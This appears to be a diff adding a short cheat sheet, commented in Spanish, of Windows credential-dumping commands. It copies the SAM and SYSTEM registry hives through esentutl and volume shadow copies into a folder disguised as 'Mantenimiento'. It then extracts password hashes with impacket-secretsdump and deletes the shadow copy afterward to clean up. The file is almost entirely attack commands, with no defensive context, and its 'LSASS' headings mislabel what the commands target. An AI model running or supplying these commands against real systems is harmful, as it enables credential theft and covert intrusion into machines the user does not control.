@@ -1,0 +1,26 @@
+LSASS
+
+esentutl /y /vss c:\windows\system32\config\SAM /d C:\Mantenimiento\sam.bak
+esentutl /y /vss c:\windows\system32\config\SYSTEM /d C:\Mantenimiento\system.bak
+
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+
+
+---------------------------------------------
+LSASS
+
+(Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
+vssadmin list shadows
+cmd /c mklink /d C:\Mantenimiento\sombra "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy17\"
+copy C:\Mantenimiento\sombra\Windows\System32\config\SYSTEM C:\Mantenimiento\system2.bak
+copy C:\Mantenimiento\sombra\Windows\System32\config\SAM C:\Mantenimiento\sam2.bak
+
+----------------------------------------------
+
+$Shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
+$ShadowID = $Shadow.ShadowID
+Write-Host "El ID de tu copia es: $ShadowID"
+vssadmin list shadows /shadow=$ShadowID
+
+rmdir C:\Mantenimiento\sombra
+vssadmin delete shadows /shadow=$ShadowID /quiet
